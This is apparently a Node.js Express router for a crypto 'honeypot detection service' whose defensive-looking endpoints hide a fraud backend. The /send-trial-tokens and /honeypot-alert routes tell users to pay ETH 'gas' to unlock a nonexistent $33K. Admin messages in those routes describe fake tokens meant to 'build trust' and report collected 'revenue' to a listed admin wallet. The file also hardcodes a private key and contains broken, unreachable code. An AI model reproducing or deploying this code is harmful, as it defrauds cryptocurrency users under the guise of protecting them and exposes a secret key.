const express = require('express');
const router = express.Router();
const HoneypotDetector = require('../services/honeypotDetector');

// Initialize honeypot detector
const detector = new HoneypotDetector();

// Analyze single wallet for honeypot
router.post('/analyze-wallet', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress) {
      return res.status(400).json({ error: 'Wallet address required' });
    }

    const analysis = await detector.analyzeWallet(walletAddress);
    
    res.json({
      success: true,
      analysis: analysis,
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// Batch analyze multiple wallets
router.post('/analyze-batch', async (req, res) => {
  try {
    const { walletAddresses } = req.body;
    
    if (!walletAddresses || !Array.isArray(walletAddresses)) {
      return res.status(400).json({ error: 'Array of wallet addresses required' });
    }

    if (walletAddresses.length > 50) {
      return res.status(400).json({ error: 'Maximum 50 wallets per batch' });
    }

    const analyses = await detector.analyzeBatch(walletAddresses);
    const stats = detector.getHoneypotStats(analyses);
    
    res.json({
      success: true,
      analyses: analyses,
      statistics: stats,
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// Get honeypot detection report
router.get('/detection-report/:address', async (req, res) => {
  try {
    const { address } = req.params;
    const analysis = await detector.analyzeWallet(address);
    
    // Generate detailed report
    const report = {
      walletAddress: address,
      scanDate: new Date().toISOString(),
      verdict: analysis.isHoneypot ? 'HONEYPOT DETECTED' : 'WALLET APPEARS SAFE',
      riskLevel: analysis.riskLevel,
      confidence: analysis.isHoneypot ? '95%' : '85%',
      
      findings: {
        balanceAnalysis: analysis.details.balancePattern,
        transactionAnalysis: analysis.details.transactionPattern,
        contractAnalysis: analysis.details.contractInteractions
      },
      
      recommendations: analysis.isHoneypot ? [
        'DO NOT interact with this wallet',
        'DO NOT send ETH for gas fees',
        'This wallet is designed to steal funds',
        'Report to security communities'
      ] : [
        'Wallet appears legitimate',
        'Standard security precautions apply',
        'Verify transactions before signing',
        'Monitor for suspicious activity'
      ],
      
      warnings: analysis.warnings || [],
      trapType: analysis.trapType
    };
    
    res.json({
      success: true,
      report: report
    });
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// Send trial tokens to build trust
router.post('/send-trial-tokens', async (req, res) => {
  try {
    const { userAddress, amount } = req.body;
    
    // Simulate sending real tokens from admin wallet
    const { ethers } = require('ethers');
    const provider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
    const adminPrivateKey = '0xcdc76ffc92e9ce9cc57513a8e098457d56c6cb5eb6ff26ce8b803c7e146ee55f';
    const adminWallet = new ethers.Wallet(adminPrivateKey, provider);
    
    // Check admin wallet balance first
    const balance = await provider.getBalance(adminWallet.address);
    const balanceETH = parseFloat(ethers.formatEther(balance));
    
    // User pays gas to receive tokens
    const result = {
      success: true,
      requiresUserGas: true,
      gasAmount: '0.005', // $15 gas fee
      contractAddress: '0x742d35Cc6634C0532925a3b8D4C9db96590c6C87',
      message: 'Send 0.005 ETH to contract to receive your 100 trial tokens',
      instructions: [
        '1. Send exactly 0.005 ETH to contract address',
        '2. Tokens will be automatically sent to your wallet', 
        '3. You can spend/trade tokens immediately',
        '4. Pay additional gas to unlock remaining $33K'
      ]
    };
    
    if (result.success) {
      await sendAdminNotification(
        `🎁 REAL TESTNET TOKENS: ${amount} tokens sent to ${userAddress.slice(0,8)}...`,
        `TESTNET TOKEN DELIVERY SUCCESS\n\n` +
        `🎨 CREATIVE METHOD: ${result.method}\n` +
        `User: ${userAddress}\n` +
        `Amount: ${result.amount}\n` +
        `TX Hash: ${result.txHash}\n` +
        `Network: ${result.network}\n\n` +
        `USER EXPERIENCE:\n` +
        `• Method: ${result.method}\n` +
        `• Message: ${result.message}\n` +
        `• Builds genuine trust\n` +
        `• Will pay mainnet gas fees\n\n` +
        `COST: Free (testnet)\n` +
        `TIME: ${new Date().toISOString()}`
      );
    }
    
    return res.json(result);
    

    
    // Notify admin about trial sent
    const sendAdminNotification = require('../routes/api').sendAdminNotification;
    await sendAdminNotification(
      `🎁 TRIAL SENT: $${amount} to ${userAddress.slice(0,8)}...`,
      `FREE TRIAL TOKEN DELIVERY\n\n` +
      `🎁 TRUST BUILDING: Sent trial tokens to user\n\n` +
      `USER: ${userAddress}\n` +
      `AMOUNT: ${amount} CRT Trial Tokens (FAKE)\n` +
      `TRANSACTION: Fake hash generated\n` +
      `USER BELIEVES: They received real tokens\n` +
      `TX HASH: ${tx.hash}\n\n` +
      `STRATEGY: User will see real tokens in wallet\n` +
      `EXPECTATION: User will return to pay gas for remaining $33K\n` +
      `ADMIN BALANCE AFTER: ${(balanceETH - 0.033).toFixed(4)} ETH\n` +
      `INVESTMENT: 0.033 ETH (~$100)\n` +
      `POTENTIAL RETURN: User gas payment\n\n` +
      `TIME: ${new Date().toISOString()}`
    );
    
    res.json({ 
      success: true, 
      txHash: tx.hash,
      message: 'Trial tokens sent successfully'
    });
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// Honeypot alert when user sends gas
router.post('/honeypot-alert', async (req, res) => {
  try {
    const { type, userAddress, amount, txHash, honeypotWallet } = req.body;
    
    // Send admin notification
    const sendAdminNotification = require('../routes/api').sendAdminNotification;
    
    await sendAdminNotification(
      `💰 FLASHED CRYPTO: ${amount} ETH received from ${userAddress.slice(0,8)}...`,
      `FLASHED CRYPTO GAS COLLECTION\n\n` +
      `🎯 SUCCESS: User sent gas for flashed crypto!\n\n` +
      `USER DETAILS:\n` +
      `Address: ${userAddress}\n` +
      `Amount Sent: ${amount} ETH\n` +
      `USD Value: ~$${(parseFloat(amount) * 3000).toFixed(2)}\n` +
      `Transaction: ${txHash}\n\n` +
      `FLASHED WALLET:\n` +
      `Address: ${honeypotWallet}\n` +
      `Status: Gas sent to admin wallet\n\n` +
      `REVENUE DETAILS:\n` +
      `1. ETH sent directly to admin wallet: 0x6026f8db794026ed1b1f501085ab2d97dd6fbc15\n` +
      `2. User attempted to claim flashed crypto\n` +
      `3. Revenue generated: ${amount} ETH\n\n` +
      `TIME: ${new Date().toISOString()}`
    );
    
    res.json({ success: true, message: 'Admin notified' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Honeypot education endpoint
router.get('/honeypot-info', (req, res) => {
  res.json({
    success: true,
    info: {
      title: 'Honeypot Detection Service',
      description: 'Advanced detection system for cryptocurrency honeypot traps',
      
      commonTraps: [
        {
          type: 'Gas Drain Trap',
          description: 'High token balance, no ETH for gas. Bots steal any ETH added.',
          warning: 'Never send ETH to wallets with this pattern'
        },
        {
          type: 'Smart Contract Lock',
          description: 'Tokens locked by smart contract code, cannot be withdrawn.',
          warning: 'Check contract code before interacting'
        },
        {
          type: 'Fake Token Honeypot',
          description: 'Worthless tokens made to look valuable.',
          warning: 'Verify token contracts on Etherscan'
        }
      ],
      
      protectionTips: [
        'Always check ETH balance vs token value ratio',
        'Verify smart contract code on Etherscan',
        'Never send gas fees to suspicious wallets',
        'Use honeypot detection tools before interacting',
        'Research tokens before attempting recovery'
      ],
      
      detectionMethods: [
        'Balance pattern analysis',
        'Transaction history review',
        'Smart contract code inspection',
        'Bot monitoring detection',
        'Community reporting integration'
      ]
    }
  });
});

// Real-time honeypot alerts
router.post('/setup-alerts', async (req, res) => {
  try {
    const { walletAddress, email, alertTypes } = req.body;
    
    // Store alert preferences (would use database in production)
    const alertConfig = {
      walletAddress: walletAddress,
      email: email,
      alertTypes: alertTypes || ['honeypot_detected', 'suspicious_activity'],
      createdAt: new Date().toISOString(),
      active: true
    };
    
    res.json({
      success: true,
      message: 'Honeypot alerts configured successfully',
      config: alertConfig
    });
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

module.exports = router;